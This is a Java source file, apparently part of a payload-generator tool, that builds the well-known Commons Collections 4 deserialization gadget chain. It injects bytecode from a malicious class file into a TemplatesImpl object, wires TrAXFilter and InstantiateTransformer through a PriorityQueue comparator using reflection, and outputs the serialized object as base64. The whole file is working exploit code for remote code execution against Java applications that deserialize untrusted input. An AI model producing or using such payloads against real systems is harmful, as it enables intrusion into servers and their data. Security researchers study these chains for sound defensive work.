package org.hasret.webserigen.payloads;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;


import org.hasret.webserigen.annotations.UseCommonsCollections4;
import org.hasret.webserigen.utils.serial;

import javax.xml.transform.Templates;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

@UseCommonsCollections4
public class CommonsCollections4 {
    public static void main(String[] args) throws IOException, NoSuchFieldException, ClassNotFoundException, InvocationTargetException, NoSuchMethodException, InstantiationException, IllegalAccessException {
        String s = generatePayload("calc");
    }
    public static String generatePayload(final String cmd) throws NoSuchMethodException, ClassNotFoundException, IOException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchFieldException {
        TemplatesImpl templates = new TemplatesImpl();
        Class c = templates.getClass();
        Field names = c.getDeclaredField("_name");
        names.setAccessible(true);
        names.set(templates,"aaaa");
        Field tfactory = c.getDeclaredField("_tfactory");
        tfactory.setAccessible(true);
        tfactory.set(templates, new TransformerFactoryImpl());

        byte[] code = Files.readAllBytes(Paths.get("D:/WebJavaSeriGen/webserigen/src/main/java/org/hasret/webserigen/payloads/evilclass/calc.class"));
        byte[][] codes = {code};
        Field bytecodes = c.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        bytecodes.set(templates, codes);

        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                instantiateTransformer};
        ChainedTransformer chainedTransformer = new ChainedTransformer<>(transformers);
//        chainedTransformer.transform();
        //cc 4
        TransformingComparator transformingComparator = new TransformingComparator<>(new ConstantTransformer<>(1));

        PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);
        priorityQueue.add(1);
        priorityQueue.add(2);

        Class<?extends TransformingComparator> c2 = transformingComparator.getClass();
        Field transformerfield = c2.getDeclaredField("transformer");
        transformerfield.setAccessible(true);
        transformerfield.set(transformingComparator,chainedTransformer);

       // serial.serialize(priorityQueue);
       //Object unserialize = serial.unserialize("ser.bin");

        return serial.serializeBytesToB64(priorityQueue);
    }
}
